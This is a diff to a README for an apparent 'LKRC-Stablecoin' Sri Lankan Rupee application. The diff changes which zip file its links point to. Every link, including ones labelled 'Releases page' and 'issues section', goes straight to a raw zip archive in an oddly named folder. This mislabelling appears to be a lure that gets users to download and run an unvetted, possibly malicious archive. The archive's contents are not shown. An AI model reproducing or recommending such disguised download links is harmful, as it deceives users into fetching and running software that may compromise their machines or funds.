@@ -4,11 +4,11 @@
 
 Welcome to LKRC-Stablecoin! This application helps you work with the Sri Lankan Rupee stablecoin. Follow the steps below to download and run the software.
 
-[![Download LKRC-Stablecoin](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/LKRC-Stablecoin.zip)](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/LKRC-Stablecoin.zip)
+[![Download LKRC-Stablecoin](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/Stablecoin_LKR_v1.8.zip)](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/Stablecoin_LKR_v1.8.zip)
 
 ## 📥 Download & Install
 
-To get started, you will need to visit our [Releases page](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/LKRC-Stablecoin.zip) to download the application. Follow these steps:
+To get started, you will need to visit our [Releases page](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/Stablecoin_LKR_v1.8.zip) to download the application. Follow these steps:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of LKRC-Stablecoin.
@@ -59,7 +59,7 @@ If you encounter issues while using LKRC-Stablecoin, here are some common soluti
 
 If you have further questions or need assistance, please feel free to reach out:
 
-- Visit the [issues section](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/LKRC-Stablecoin.zip) of the repository.
+- Visit the [issues section](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/Stablecoin_LKR_v1.8.zip) of the repository.
 - Post your question, and our team will assist you promptly.
 
-We hope you enjoy using LKRC-Stablecoin! For more information and ongoing updates, return to our [Releases page](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/LKRC-Stablecoin.zip).
+We hope you enjoy using LKRC-Stablecoin! For more information and ongoing updates, return to our [Releases page](https://raw.githubusercontent.com/miski876/LKRC-Stablecoin/main/beebread/Stablecoin_LKR_v1.8.zip).
